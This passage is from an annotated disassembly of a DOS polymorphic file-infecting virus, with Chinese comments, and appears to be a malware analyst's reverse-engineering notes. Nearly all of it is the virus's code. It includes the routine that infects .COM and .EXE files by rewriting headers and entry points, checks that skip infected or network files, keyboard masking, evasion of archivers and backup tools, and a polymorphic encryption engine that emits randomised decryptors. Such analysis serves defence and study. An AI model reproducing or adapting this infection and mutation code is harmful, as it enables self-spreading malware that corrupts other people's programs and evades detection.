+9E80:08B4 2E8E16D512     MOV	SS,CS:[12D5] 	;恢复原堆栈
+9E80:08B9 2E8B26D712     MOV	SP,CS:[12D7] 
+9E80:08BE FB             STI	 		;转原 INT 21
+9E80:08BF 2EFF2EFB13     JMP	FAR CS:[13FB] 
+;=========================================================================
+9E80:08C4 E83BF8         CALL	0102 		;POPA
+9E80:08C7 EBEA           JMP	08B3 		;
+;=========================================================================
+9E80:08C9 0E             PUSH	CS 		;传染子程序
+9E80:08CA 1F             POP	DS 
+9E80:08CB E83D01         CALL	0A0B 		;读文件头 18H => 1270
+9E80:08CE 7244           JB	0914 
+9E80:08D0 8BF2           MOV	SI,DX 
+9E80:08D2 BF8812         MOV	DI,1288 	;文件头 18H 移动到 1288
+9E80:08D5 FC             CLD	 		;准备修改
+9E80:08D6 F3             REPZ	
+9E80:08D7 A4             MOVSB	 
+9E80:08D8 E8D000         CALL	09AB 		;取系统文件表项
+9E80:08DB C44511         LES	AX,[DI+11] 	;文件大小 DX:AX
+9E80:08DE 8CC2           MOV	DX,ES 
+9E80:08E0 894515         MOV	[DI+15],AX 	;移动文件指针 => 文件尾
+9E80:08E3 895517         MOV	[DI+17],DX 
+9E80:08E6 0E             PUSH	CS 
+9E80:08E7 0E             PUSH	CS 
+9E80:08E8 07             POP	ES 
+9E80:08E9 1F             POP	DS 
+9E80:08EA 8B0C           MOV	CX,[SI] 	;文件头 2 字节
+9E80:08EC 81F95A4D       CMP	CX,4D5A 
+9E80:08F0 7424           JZ	0916 
+9E80:08F2 81F94D5A       CMP	CX,5A4D 
+9E80:08F6 741E           JZ	0916 		;.EXE 文件转 0916
+;==========================================================================
+9E80:08F8 0BD5           OR	DX,BP 		;传染 .COM 文件
+9E80:08FA 7518           JNZ	0914 
+9E80:08FC 3D14ED         CMP	AX,ED14 	; > 60692 字节不传染
+9E80:08FF 7713           JA	0914 
+9E80:0901 3DE803         CMP	AX,03E8 	; < 1000 字节不传染
+9E80:0904 720E           JB	0914 
+9E80:0906 C604E9         MOV	Byte Ptr [SI],E9 	;文件头改为 JMP XXXX
+9E80:0909 FEC4           INC	AH 		;ADD AX,100H
+9E80:090B 50             PUSH	AX 		;.COM 文件入口 11DA
+9E80:090C 05D710         ADD	AX,10D7 	;(0100+0003+10D7)
+9E80:090F 894401         MOV	[SI+01],AX 
+9E80:0912 EB7B           JMP	098F 
+9E80:0914 F9             STC	 
+9E80:0915 C3             RET	 
+;===========================================================================
+9E80:0916 837C0CFF       CMP	Word Ptr [SI+0C],-01 	;传染 .EXE 文件
+9E80:091A 75F8           JNZ	0914 		;要分配内存不为 -1 返回
+9E80:091C 8BE8           MOV	BP,AX 
+9E80:091E 8BFA           MOV	DI,DX 		;DI:BP = 文件长
+9E80:0920 B90002         MOV	CX,0200 
+9E80:0923 F7F1           DIV	CX 
+9E80:0925 0BD2           OR	DX,DX 
+9E80:0927 7401           JZ	092A 
+9E80:0929 40             INC	AX 
+9E80:092A 2B4404         SUB	AX,[SI+04] 
+9E80:092D 75E5           JNZ	0914 
+9E80:092F 2B5402         SUB	DX,[SI+02] 	;文件有覆盖部分不传染
+9E80:0932 75E0           JNZ	0914 
+9E80:0934 B88812         MOV	AX,1288 
+9E80:0937 03C5           ADD	AX,BP 
+9E80:0939 13D7           ADC	DX,DI 		;DX:AX = 新文件长
+9E80:093B F7F1           DIV	CX 
+9E80:093D 0BD2           OR	DX,DX 
+9E80:093F 7401           JZ	0942 
+9E80:0941 40             INC	AX 
+9E80:0942 894404         MOV	[SI+04],AX 
+9E80:0945 895402         MOV	[SI+02],DX 	;新映象长度
+9E80:0948 BB90E9         MOV	BX,E990 
+9E80:094B 33C9           XOR	CX,CX 
+9E80:094D 3BEB           CMP	BP,BX 
+9E80:094F 7205           JB	0956 
+9E80:0951 83ED10         SUB	BP,+10 
+9E80:0954 E2F7           LOOP	094D 
+9E80:0956 83FF0F         CMP	DI,+0F 		;文件长 > 640K 不传染
+9E80:0959 77B9           JA	0914 
+9E80:095B 91             XCHG	AX,CX 		;文件长低位 > E990 部分
+9E80:095C B104           MOV	CL,04 		;转移到 DI
+9E80:095E D3CF           ROR	DI,CL 		;
+9E80:0960 0BC0           OR	AX,AX 
+9E80:0962 7404           JZ	0968 
+9E80:0964 2BF8           SUB	DI,AX 		;DIx10 + BP = 文件长
+9E80:0966 73AC           JNB	0914 
+9E80:0968 2B7C08         SUB	DI,[SI+08] 	;减去文件头长
+9E80:096B 55             PUSH	BP 
+9E80:096C 81C5DA11       ADD	BP,11DA 	;新入口 : 11DA
+9E80:0970 896C14         MOV	[SI+14],BP 	;新 CS:IP
+9E80:0973 897C16         MOV	[SI+16],DI 
+9E80:0976 81C50002       ADD	BP,0200 	;新 CS:IP+0200
+9E80:097A 896C10         MOV	[SI+10],BP 	;为新堆栈
+9E80:097D 897C0E         MOV	[SI+0E],DI 
+9E80:0980 BD0080         MOV	BP,8000 
+9E80:0983 D3FB           SAR	BX,CL 		;BX = E990,CL=4
+9E80:0985 8B440A         MOV	AX,[SI+0A] 	;分配最小内存
+9E80:0988 2BC3           SUB	AX,BX 
+9E80:098A 7303           JNB	098F 
+9E80:098C 89440A         MOV	[SI+0A],AX 
+;=======================================================================
+9E80:098F 58             POP	AX 		;.COM 由此入
+9E80:0990 E83F01         CALL	0AD2 		;产生加密代码
+9E80:0993 55             PUSH	BP 
+9E80:0994 9D             POPF	 
+9E80:0995 7213           JB	09AA 
+9E80:0997 E81100         CALL	09AB 		;取系统文件表项
+9E80:099A 894D15         MOV	[DI+15],CX 	;文件指针移动到文件头
+9E80:099D 894D17         MOV	[DI+17],CX 
+9E80:09A0 B440           MOV	AH,40
+9E80:09A2 BA8812         MOV	DX,1288 
+9E80:09A5 0E             PUSH	CS 
+9E80:09A6 1F             POP	DS 
+9E80:09A7 E86900         CALL	0A13 		;写新文件头 18H 字节
+9E80:09AA C3             RET	 
+;=======================================================================
+;取系统文件表项于 ES:DI
+;返回 CY 不传染, NZ = 已传染
+9E80:09AB 50             PUSH	AX 
+9E80:09AC 53             PUSH	BX 
+9E80:09AD B82012         MOV	AX,1220 
+9E80:09B0 2E8B1EC30A     MOV	BX,CS:[0AC3] 
+9E80:09B5 CD2F           INT	2F 		;取文件表地址
+9E80:09B7 721D           JB	09D6 
+9E80:09B9 B81612         MOV	AX,1216 
+9E80:09BC 268A1D         MOV	BL,ES:[DI] 
+9E80:09BF 80FBFF         CMP	BL,FF 
+9E80:09C2 F5             CMC	 
+9E80:09C3 7411           JZ	09D6 
+9E80:09C5 CD2F           INT	2F 		;取系统文件表项
+9E80:09C7 720D           JB	09D6 
+9E80:09C9 06             PUSH	ES 
+9E80:09CA 1F             POP	DS 
+9E80:09CB F6450580       TEST	Byte Ptr [DI+05],80 
+9E80:09CF F5             CMC	 		;先设置为 CY
+9E80:09D0 7504           JNZ	09D6 		;远程文件不传染
+9E80:09D2 F6451080       TEST	Byte Ptr [DI+10],80 
+9E80:09D6 5B             POP	BX 		;判是否已传染
+9E80:09D7 58             POP	AX 		;没有传染返回 NZ,NC
+9E80:09D8 C3             RET	 
+;==========================================================================
+;切换 INT 13 / INT 14 / INT 15 / INT 40
+;(DOS INT 与 BIOS 初始 INT 之间)
+9E80:09D9 50             PUSH	AX 
+9E80:09DA 53             PUSH	BX 
+9E80:09DB 52             PUSH	DX 
+9E80:09DC 1E             PUSH	DS 
+9E80:09DD B013           MOV	AL,13 
+9E80:09DF BFEB13         MOV	DI,13EB 
+9E80:09E2 0E             PUSH	CS 
+9E80:09E3 1F             POP	DS 
+9E80:09E4 E8DCF6         CALL	00C3 		;取中断向量
+9E80:09E7 8CC2           MOV	DX,ES 		;于 ES:BX
+9E80:09E9 871D           XCHG	BX,[DI] 	;保存于 13EB
+9E80:09EB FC             CLD	 
+9E80:09EC AF             SCASW	 
+9E80:09ED 87D3           XCHG	DX,BX 
+9E80:09EF 871D           XCHG	BX,[DI] 
+9E80:09F1 AF             SCASW	 
+9E80:09F2 8EDB           MOV	DS,BX 
+9E80:09F4 E8DDF6         CALL	00D4 		;设置 BIOS 初始值
+9E80:09F7 3C15           CMP	AL,15 
+9E80:09F9 B015           MOV	AL,15 
+9E80:09FB 7305           JNB	0A02 
+9E80:09FD 83C704         ADD	DI,+04 
+9E80:0A00 EBE0           JMP	09E2 
+9E80:0A02 B040           MOV	AL,40
+9E80:0A04 74DC           JZ	09E2 
+9E80:0A06 1F             POP	DS 
+9E80:0A07 5A             POP	DX 
+9E80:0A08 5B             POP	BX 
+9E80:0A09 58             POP	AX 
+9E80:0A0A C3             RET	 
+;==========================================================================
+;0A0B  读文件头 18 字节到 1270
+;0A0E  写文件头 18 字节
+9E80:0A0B B43F           MOV	AH,3F
+9E80:0A0D 3DB440         CMP	AX,40B4 
+9E80:0A10 BA7012         MOV	DX,1270 
+9E80:0A13 B91800         MOV	CX,0018 
+9E80:0A16 E8A900         CALL	0AC2 
+9E80:0A19 7202           JB	0A1D 
+9E80:0A1B 2BC1           SUB	AX,CX 
+9E80:0A1D C3             RET	 
+;==========================================================================
+9E80:0A1E B024           MOV	AL,24		;设置新 INT 24
+9E80:0A20 2EC516E713     LDS	DX,CS:[13E7] 
+9E80:0A25 E8ACF6         CALL	00D4 
+9E80:0A28 E421           IN	AL,21		;屏蔽键盘
+9E80:0A2A 24FD           AND	AL,FD 
+9E80:0A2C E621           OUT	21,AL
+9E80:0A2E C3             RET	 
+;==========================================================================
+9E80:0A2F 894610         MOV	[BP+10],AX 
+9E80:0A32 9C             PUSHF	 
+9E80:0A33 8F4612         POP	[BP+12] 
+9E80:0A36 C3             RET	 
+;=========================================================================
+;判断 INT 21 是否在压缩程序中调用
+;如果在压缩程序中调用, 则欺骗功能不使用
+9E80:0A37 50             PUSH	AX 
+9E80:0A38 51             PUSH	CX 
+9E80:0A39 56             PUSH	SI 
+9E80:0A3A 57             PUSH	DI 
+9E80:0A3B 06             PUSH	ES 
+9E80:0A3C B002           MOV	AL,02 
+9E80:0A3E 0AC0           OR	AL,AL 
+9E80:0A40 753E           JNZ	0A80 
+9E80:0A42 E84B00         CALL	0A90 		;取当前执行文件名
+9E80:0A45 268B05         MOV	AX,ES:[DI] 	;于 ES:DI
+9E80:0A48 3D4152         CMP	AX,5241 	; "AR" = ARJ
+9E80:0A4B 7433           JZ	0A80 
+9E80:0A4D 3D4C48         CMP	AX,484C 	; "LH" = LHA
+9E80:0A50 742E           JZ	0A80 
+9E80:0A52 3D504B         CMP	AX,4B50 	; "PK" = PKZIP
+9E80:0A55 7429           JZ	0A80 		;如果是以上文件,返回 ZR
+9E80:0A57 B90200         MOV	CX,0002 
+9E80:0A5A BE860A         MOV	SI,0A86 
+9E80:0A5D 51             PUSH	CX 
+9E80:0A5E 57             PUSH	DI 
+9E80:0A5F B108           MOV	CL,08 
+9E80:0A61 2EAC           LODSB	CS: 
+9E80:0A63 346C           XOR	AL,6C		;判断是否 BACKUP
+9E80:0A65 F2             REPNZ			;或 MODEM
+9E80:0A66 AE             SCASB	 
+9E80:0A67 7510           JNZ	0A79 		;0A86 及 0A8B
+9E80:0A69 80F903         CMP	CL,03 		;处为加密的字符串
+9E80:0A6C 720B           JB	0A79 		;BACK 及 MODEM
+9E80:0A6E B104           MOV	CL,04 
+9E80:0A70 2EAC           LODSB	CS: 
+9E80:0A72 346C           XOR	AL,6C
+9E80:0A74 7403           JZ	0A79 
+9E80:0A76 AE             SCASB	 
+9E80:0A77 E1F7           LOOPZ	0A70 
+9E80:0A79 BE8B0A         MOV	SI,0A8B 
+9E80:0A7C 5F             POP	DI 
+9E80:0A7D 59             POP	CX 
+9E80:0A7E E0DD           LOOPNZ	0A5D 
+9E80:0A80 07             POP	ES 
+9E80:0A81 5F             POP	DI 
+9E80:0A82 5E             POP	SI 
+9E80:0A83 59             POP	CX 
+9E80:0A84 58             POP	AX 
+9E80:0A85 C3             RET	 
+9E80:0A86                    2E 2D-2F 27 6C 21 23 28 29 21        ..........
+;=======================================================================
+;从 MCB 中取执行文件名到 ES:DI
+9E80:0A90 50             PUSH	AX
+9E80:0A91 53             PUSH	BX
+9E80:0A92 B462           MOV	AH,62
+9E80:0A94 E82E00         CALL	0AC5 		;当前 PSP
+9E80:0A97 4B             DEC	BX 		;执行程序的 MCB
+9E80:0A98 8EC3           MOV	ES,BX 
+9E80:0A9A BF0800         MOV	DI,0008 	;MCB:0008 = 执行文件名
+9E80:0A9D FC             CLD	 
+9E80:0A9E 5B             POP	BX 
+9E80:0A9F 58             POP	AX 
+9E80:0AA0 C3             RET	 
+;==================================================================
+;取 DTA 地址
+9E80:0AA1 B42F           MOV	AH,2F
+9E80:0AA3 E81F00         CALL	0AC5 
+9E80:0AA6 06             PUSH	ES 
+9E80:0AA7 1F             POP	DS 
+9E80:0AA8 C3             RET	 
+;==================================================================
+    病毒执行  INT       13 ???
+9E80:0AA9 E838F7         CALL	01E4 
+9E80:0AAC 9C             PUSHF	 
+9E80:0AAD 2EFF1EEF13     CALL	FAR CS:[13EF] 
+9E80:0AB2 E82FF7         CALL	01E4 
+9E80:0AB5 C3             RET	 
+;===================================================================
+9E80:0AB6 F6C280         TEST	DL,80 
+9E80:0AB9 7410           JZ	0ACB 
+9E80:0ABB 9C             PUSHF	 
+9E80:0ABC 2EFF1EEB13     CALL	FAR CS:[13EB] 
+9E80:0AC1 C3             RET	 
+9E80:0AC2 BB0100         MOV	BX,0001 
+9E80:0AC5 9C             PUSHF	 
+9E80:0AC6 0E             PUSH	CS 
+9E80:0AC7 E8F5FD         CALL	08BF 
+9E80:0ACA C3             RET	 
+9E80:0ACB 9C             PUSHF	 
+9E80:0ACC 2EFF1EF713     CALL	FAR CS:[13F7] 
+9E80:0AD1 C3             RET	 
+;========================================================================
+;	产生变型加密代码
+;	输入 : AX = IP 入口	BP = 0 (.COM) = 8000 (.EXE)
+;========================================================================
+; 子程序中用到的一些数据
+; BP : 8-15 位用作标志   0-7 位用作寄存器是否已使用标志,一位代表一个寄存器
+;	BIT 8 (0100)==不执行产生随机代码子程序
+;	BIT 9 (0200)==产生指令时保存指令到 [1410]
+;	BIT 10(0400)==在变型解密算法中,CX为密匙寄存器,0C7C子程序已执行
+;	BIT 11(0800)==随机无效指令中不能改变 CY 标志
+;	BIT 12(1000)==
+;	BIT 13(2000)==在长度寄存器为CX时,寄存器减一子程序中CX未减
+;	BIT 14(4000)==?????
+;	BIT 15(8000)==被传染程序为 .EXE 文件
+; [11A3] = 密匙值
+; [1104] = 入口 IP 值		[1406] = 解密指针偏移
+; [1108] = 加密算法指令指针	[110A] = 加密算法指令结束指针
+; [140C] = 密匙寄存器 		[140D] = 计数寄存器
+; [140E] = 指针寄存器之一	[140F] = 指针寄存器之二
+; [1410] = 上个随机指令
+9E80:0AD2 A30414         MOV	[1404],AX 
+9E80:0AD5 BFDA11         MOV	DI,11DA 	;加密代码存放于 11DA
+9E80:0AD8 BB330E         MOV	BX,0E33 	;按随机顺序执行
+9E80:0ADB B9210E         MOV	CX,0E21 	;0E33 0E21 和 0E40
+9E80:0ADE BA400E         MOV	DX,0E40 	;产生密匙/计数/指针
+9E80:0AE1 BE5311         MOV	SI,1153 	;三种寄存器的原始数据
+9E80:0AE4 81CDEF00       OR	BP,00EF 
+9E80:0AE8 E84506         CALL	1130 		;随机执行
+9E80:0AEB 57             PUSH	DI 
+9E80:0AEC 57             PUSH	DI 
+9E80:0AED BE9E11         MOV	SI,119E 
+9E80:0AF0 BFA012         MOV	DI,12A0 
+9E80:0AF3 B93500         MOV	CX,0035 
+9E80:0AF6 F3             REPZ	
+9E80:0AF7 A4             MOVSB	 
+9E80:0AF8 C7060814AC12   MOV	Word Ptr [1408],12AC 	;加密算法代码指针
+9E80:0AFE 5F             POP	DI 
+9E80:0AFF BBA80C         MOV	BX,0CA8 	;随机执行 0CA8/0D9E/0C7C/0C57
+9E80:0B02 B99E0D         MOV	CX,0D9E 	;计数寄存器加一
+9E80:0B05 BA7C0C         MOV	DX,0C7C 	;指针寄存器加二
+9E80:0B08 BE570C         MOV	SI,0C57 	;指针寄存器处数据解密
+9E80:0B0B E82206         CALL	1130 		;随机决定是否每次改变密匙
+9E80:0B0E B80200         MOV	AX,0002 
+9E80:0B11 50             PUSH	AX 
+9E80:0B12 E85106         CALL	1166 
+9E80:0B15 58             POP	AX 
+9E80:0B16 7406           JZ	0B1E 
+9E80:0B18 F7C50040       TEST	BP,4000
+9E80:0B1C 755C           JNZ	0B7A 
+9E80:0B1E E84506         CALL	1166 
+9E80:0B21 7406           JZ	0B29 
+9E80:0B23 F7C50020       TEST	BP,2000 
+9E80:0B27 7551           JNZ	0B7A 
+;===========================================================================
+; 测试计数寄存器分支之一: ADD R_计数,0
+9E80:0B29 81CD0008       OR	BP,0800 	;设置随机指令不能改变标志 CY
+9E80:0B2D B80200         MOV	AX,0002 
+9E80:0B30 99             CWD	 		;DX = 0
+9E80:0B31 E83206         CALL	1166 
+9E80:0B34 A00D14         MOV	AL,[140D] 	;计数寄存器
+9E80:0B37 750F           JNZ	0B48 
+9E80:0B39 E81E06         CALL	115A 
+9E80:0B3C 7505           JNZ	0B43 
+9E80:0B3E E84C04         CALL	0F8D 		;ADD R_AL,0
+9E80:0B41 EB37           JMP	0B7A 
+9E80:0B43 E8E103         CALL	0F27 		;ADD R_AL,0
+9E80:0B46 EB32           JMP	0B7A 
+9E80:0B48 B103           MOV	CL,03 
+9E80:0B4A 8AE8           MOV	CH,AL 
+9E80:0B4C D2E5           SHL	CH,CL 
+9E80:0B4E 0AC5           OR	AL,CH 		;mm r/m 及 rrr = R_AL
+9E80:0B50 BB0200         MOV	BX,0002 
+9E80:0B53 E8FE05         CALL	1154 
+9E80:0B56 750D           JNZ	0B65 
+9E80:0B58 0DC009         OR	AX,09C0 	;09 C0 = OR R_AL,R_AL
+9E80:0B5B E8FC05         CALL	115A 
+9E80:0B5E 7510           JNZ	0B70 
+9E80:0B60 80CC02         OR	AH,02 		;0B C0 = OR R_AL,R_AL
+9E80:0B63 EB0B           JMP	0B70 
+9E80:0B65 4B             DEC	BX 
+9E80:0B66 7505           JNZ	0B6D 
+9E80:0B68 0DC021         OR	AX,21C0 	;21 C0 = AND R_AL,R_AL
+9E80:0B6B EBEE           JMP	0B5B 
+9E80:0B6D 0DC085         OR	AX,85C0 	;85 C0 = TEST R_AL,R_AL
+9E80:0B70 86C4           XCHG	AL,AH 		;保存测试指令
+9E80:0B72 AB             STOSW	 
+9E80:0B73 81CD0018       OR	BP,1800 	;无效指令中不能改变标志 CY
+9E80:0B77 E8AF04         CALL	1029 
+;
+9E80:0B7A 81E5FFF7       AND	BP,F7FF 	;消 0800, 可以改变 CY
+9E80:0B7E F7C50020       TEST	BP,2000 	;计数寄存器为 CX 时未减一
+9E80:0B82 741A           JZ	0B9E 
+9E80:0B84 B0E2           MOV	AL,E2 		;E2 = LOOP
+9E80:0B86 F7C50010       TEST	BP,1000 
+9E80:0B8A 7464           JZ	0BF0 
+9E80:0B8C E8CB05         CALL	115A 
+9E80:0B8F 755F           JNZ	0BF0 
+9E80:0B91 48             DEC	AX 		;E1 = LOOPZ
+9E80:0B92 E8C505         CALL	115A 
+9E80:0B95 752A           JNZ	0BC1 
+9E80:0B97 48             DEC	AX 		;E0 = LOOPNZ
+9E80:0B98 EB56           JMP	0BF0 
+; 使用 LOOP/LOOPNZ loop_addr 方式转 0BF0
+; 使用 LOOPZ next, JMP loop_addr 方式转 0BC1
+9E80:0B9A 75 79 7D 7F    JNZ/JNS/JGE/JG
+9E80:0B9E BB9A0B         MOV	BX,0B9A 	;生成跳转指令
+9E80:0BA1 B80300         MOV	AX,0003 
+9E80:0BA4 E8BF05         CALL	1166 
+9E80:0BA7 D7             XLAT	 
+9E80:0BA8 BB0200         MOV	BX,0002 
+9E80:0BAB E8A605         CALL	1154 
+9E80:0BAE 7540           JNZ	0BF0 
+9E80:0BB0 803E0D1401     CMP	Byte Ptr [140D],01 	;计数寄存器为 CX
+9E80:0BB5 7509           JNZ	0BC0 
+9E80:0BB7 B304           MOV	BL,04 
+9E80:0BB9 E89805         CALL	1154 
+9E80:0BBC 7502           JNZ	0BC0 
+; 转 0BC0 : 使用 JNZ/JNS/JGE/JG loop 方式
+;======================================================================
+; 分支之一: 使用 JCXZ/JZ/JS/JL/JLE next, JMP/JNZ/JNS/JGE/JG loop_addr 方式
+9E80:0BBE B0E4           MOV	AL,E4 		;E3 = JCXZ
+9E80:0BC0 48             DEC	AX 		;
+9E80:0BC1 AB             STOSW	 
+9E80:0BC2 3C7F           CMP	AL,7F 		;使用 JCXZ, 第二部分只用 JMP
+9E80:0BC4 7709           JA	0BCF 
+9E80:0BC6 E89105         CALL	115A 
+9E80:0BC9 7504           JNZ	0BCF 
+9E80:0BCB 81CD0008       OR	BP,0800 	;随机指令不能改变 CY
+9E80:0BCF 8BF7           MOV	SI,DI 
+9E80:0BD1 E85504         CALL	1029 
+9E80:0BD4 8D44FE         LEA	AX,[SI-02] 
+9E80:0BD7 2BC7           SUB	AX,DI 
+9E80:0BD9 F6D8           NEG	AL 
+9E80:0BDB 8844FF         MOV	[SI-01],AL 
+9E80:0BDE F7C50008       TEST	BP,0800 
+9E80:0BE2 B0EB           MOV	AL,EB 		;EB = JMP next_addr
+9E80:0BE4 740A           JZ	0BF0 
+9E80:0BE6 B80300         MOV	AX,0003 	;
+9E80:0BE9 E87A05         CALL	1166 
+9E80:0BEC BB9A0B         MOV	BX,0B9A 
+9E80:0BEF D7             XLAT	 
+9E80:0BF0 AA             STOSB	 		;跳转指令部分
+9E80:0BF1 58             POP	AX 		;第二部分开始指针
+9E80:0BF2 48             DEC	AX 
+9E80:0BF3 2BC7           SUB	AX,DI 		;跳转偏移部分
+9E80:0BF5 AA             STOSB	 
+9E80:0BF6 81CDEF00       OR	BP,00EF 	;能使用全部寄存器
+9E80:0BFA 81E5FFF7       AND	BP,F7FF 	;清不能改变标志 CY
+9E80:0BFE E82804         CALL	1029 		;插入随机指令
+9E80:0C01 B81300         MOV	AX,0013 
+9E80:0C04 E85F05         CALL	1166 
+9E80:0C07 7533           JNZ	0C3C 
+9E80:0C09 A10414         MOV	AX,[1404] 
+9E80:0C0C 057203         ADD	AX,0372 
+9E80:0C0F 92             XCHG	AX,DX 
+9E80:0C10 E8ED04         CALL	1100 
+9E80:0C13 E88B02         CALL	0EA1 
+9E80:0C16 0DE0FF         OR	AX,FFE0 
+9E80:0C19 E83E05         CALL	115A 
+9E80:0C1C 7504           JNZ	0C22 
+9E80:0C1E 86C4           XCHG	AL,AH 
+9E80:0C20 EB23           JMP	0C45 
+9E80:0C22 BB0200         MOV	BX,0002 
+9E80:0C25 E82C05         CALL	1154 
+9E80:0C28 7507           JNZ	0C31 
+9E80:0C2A 3410           XOR	AL,10 
+9E80:0C2C 86C4           XCHG	AL,AH 
+9E80:0C2E AB             STOSW	 
+9E80:0C2F EB03           JMP	0C34 
+9E80:0C31 34B0           XOR	AL,B0 
+9E80:0C33 AA             STOSB	 
+9E80:0C34 E8F203         CALL	1029 
+9E80:0C37 B0C3           MOV	AL,C3 
+9E80:0C39 AA             STOSB	 
+9E80:0C3A EB0A           JMP	0C46 
+9E80:0C3C B0E9           MOV	AL,E9 
+9E80:0C3E AA             STOSB	 
+9E80:0C3F 8D8590FC       LEA	AX,[DI+FC90] 
+9E80:0C43 F7D8           NEG	AX 
+9E80:0C45 AB             STOSW	 
+9E80:0C46 8B360A14       MOV	SI,[140A] 
+9E80:0C4A 81FF7012       CMP	DI,1270 
+9E80:0C4E 7204           JB	0C54 
+9E80:0C50 F9             STC	 
+9E80:0C51 9C             PUSHF	 
+9E80:0C52 5D             POP	BP 
+9E80:0C53 C3             RET	 
+9E80:0C54 E94906         JMP	12A0 
+;==========================================================================
+; 由 0B08 调用, 生成指针寄存器加二指令
+; 单寄存器时为 寄存器加二
+; 双寄存器时为 寄存器加二 或 随机将两个寄存器加一
+9E80:0C57 A10E14         MOV	AX,[140E] 	;AH = 第二指针寄存器
+9E80:0C5A BA0200         MOV	DX,0002 	;AL = 第一指针寄存器
+9E80:0C5D 80FCFF         CMP	AH,FF 
+9E80:0C60 7412           JZ	0C74 
+9E80:0C62 E8F504         CALL	115A 
+9E80:0C65 7506           JNZ	0C6D 		;分支之一
+9E80:0C67 4A             DEC	DX 
+9E80:0C68 E80200         CALL	0C6D 
+9E80:0C6B EB05           JMP	0C72 
+9E80:0C6D E8EA04         CALL	115A 		;分支之二
+9E80:0C70 7502           JNZ	0C74 
+9E80:0C72 86C4           XCHG	AL,AH 		;随机将第一或第二指针寄存器加一
+9E80:0C74 E81603         CALL	0F8D 		;分支之三
+9E80:0C77 29160614       SUB	[1406],DX 	;0F8D 为 ADD R_AL,数_DX
+9E80:0C7B C3             RET	 		;[1406] 为指针偏移
+;===========================================================================
+; 由 0B05 处调用, 生成计数寄存器减一指令
+; 如果 计数寄存器 = CX
+; 在以后再减 (设置 BP 2000 为标志)
+9E80:0C7C 81FE7C0C       CMP	SI,0C7C 	;非最后调用转 0C8B
+9E80:0C80 7509           JNZ	0C8B 
+9E80:0C82 E8D504         CALL	115A 		;
+9E80:0C85 7504           JNZ	0C8B 
+9E80:0C87 81CD0048       OR	BP,4800 	;01001000
+9E80:0C8B A00D14         MOV	AL,[140D] 	;密文长度寄存器
+9E80:0C8E 3C01           CMP	AL,01 
+9E80:0C90 750B           JNZ	0C9D 
+9E80:0C92 E8C504         CALL	115A 		;寄存器为 CX
+9E80:0C95 7506           JNZ	0C9D 
+9E80:0C97 81CD0020       OR	BP,2000 	;寄存器为 CX, BP 设置为 2000
+9E80:0C9B EB06           JMP	0CA3 		;且不执行 SUB R_AL,1 指令
+9E80:0C9D BAFFFF         MOV	DX,FFFF 	;寄存器不是 CX
+9E80:0CA0 E8EA02         CALL	0F8D 		;产生SUB R_AL,1 (ADD R_AL,-1)
+9E80:0CA3 81CD0004       OR	BP,0400 	;设置 0400
+9E80:0CA7 C3             RET	 
+;===========================================================================
+; 由 0AFF 处调用, 生成加密及解密代码
+; 可能性: ADC/SBB/XOR/ROL/ROR ==> 11/19/31/D3/D3
+9E80:0CA8 55             PUSH	BP 
+9E80:0CA9 81E5FFFB       AND	BP,FBFF 	;1011
+9E80:0CAD A00C14         MOV	AL,[140C] 	;密匙寄存器
+9E80:0CB0 50             PUSH	AX 
+9E80:0CB1 B80400         MOV	AX,0004 
+9E80:0CB4 E8AF04         CALL	1166 
+9E80:0CB7 BB0501         MOV	BX,0105 	;加密算法
+9E80:0CBA B91911         MOV	CX,1119 	;解密变型算法
+9E80:0CBD BA0529         MOV	DX,2905		;加密算法
+9E80:0CC0 742B           JZ	0CED 
+9E80:0CC2 48             DEC	AX 
+9E80:0CC3 7424           JZ	0CE9 
+9E80:0CC5 48             DEC	AX 
+9E80:0CC6 7507           JNZ	0CCF 
+;分支之一:
+9E80:0CC8 B731           MOV	BH,31		;BH = 31, 解密变型算法为 XOR
+9E80:0CCA BA0531         MOV	DX,3105 	;DX = 31 05
+9E80:0CCD EB2A           JMP	0CF9 		;加密算法为 XOR [DI],AX
+;分支之二:
+9E80:0CCF 803E0C1401     CMP	Byte Ptr [140C],01 
+9E80:0CD4 75DB           JNZ	0CB1 
+9E80:0CD6 81CD0004       OR	BP,0400 	;密匙寄存器为 CX
+9E80:0CDA B7D3           MOV	BH,D3 		;则采用 ROL 算法
+9E80:0CDC BA0DD3         MOV	DX,D30D 	;解密变型算法为 BX = D3 0D
+9E80:0CDF 48             DEC	AX 		;ROR word ptr [??],CL
+9E80:0CE0 7402           JZ	0CE4 		;加密算法为 D3 05
+9E80:0CE2 87DA           XCHG	BX,DX 		;ROL word ptr [DI],CL
+;分支之五					;修改 r/m 为 000 或 001
+9E80:0CE4 A20C14         MOV	[140C],AL 	;因为D3 mm 000 r/m=ROL r/m16,CL
+9E80:0CE7 EB10           JMP	0CF9 		;    D3 mm 001 r/m=ROR r/m16,CL
+;分支之三
+9E80:0CE9 86F7           XCHG	DH,BH 		;CH = 19 解密变型算法为 SBB
+9E80:0CEB 86CD           XCHG	CL,CH 		;加密算法为 01 05, ADD [DI],AX
+;分支之四
+9E80:0CED E86A04         CALL	115A 		;BH = 11
+9E80:0CF0 7507           JNZ	0CF9 		;解密变型算法为 ADC
+9E80:0CF2 53             PUSH	BX 		;DX = 29 05 
+9E80:0CF3 8AFD           MOV	BH,CH 		;加密算法为 SUB [DI],AX
+9E80:0CF5 E81403         CALL	100C 		;产生清 CY 标志指令
+9E80:0CF8 3C53           CMP	AL,53    -----
+                                              |
+     0CF9 53             PUSH	BX            |
+9E80:0CFA F7C50080       TEST	BP,8000  <----
+9E80:0CFE 740F           JZ	0D0F 
+9E80:0D00 E8E103         CALL	10E4 		;判断寄存器之一是否为 BP
+9E80:0D03 740A           JZ	0D0F 		;是转 0D0F
+9E80:0D05 B02E           MOV	AL,2E		;2E = CS:
+9E80:0D07 E85004         CALL	115A 
+9E80:0D0A 7502           JNZ	0D0E 
+9E80:0D0C B036           MOV	AL,36		;36 = SS:
+9E80:0D0E AA             STOSB	 
+9E80:0D0F 8AC7           MOV	AL,BH 		;
+9E80:0D11 AA             STOSB	 
+9E80:0D12 A10E14         MOV	AX,[140E] 
+9E80:0D15 80FCFF         CMP	AH,FF 
+9E80:0D18 7402           JZ	0D1C 
+9E80:0D1A 02C4           ADD	AL,AH 		;两寄存器 相加
+9E80:0D1C BB910D         MOV	BX,0D91 	;BX+SI=9  BX+DI=10
+9E80:0D1F D7             XLAT	 		;BP+SI=11 BP+DI=12
+9E80:0D20 E8C103         CALL	10E4 		;换码后分别为 0/1/2/3
+						;单寄存器时
+						;BX=3     BP=5
+						;SI=6     DI=7
+						;换码后分别为 7/6/4/5
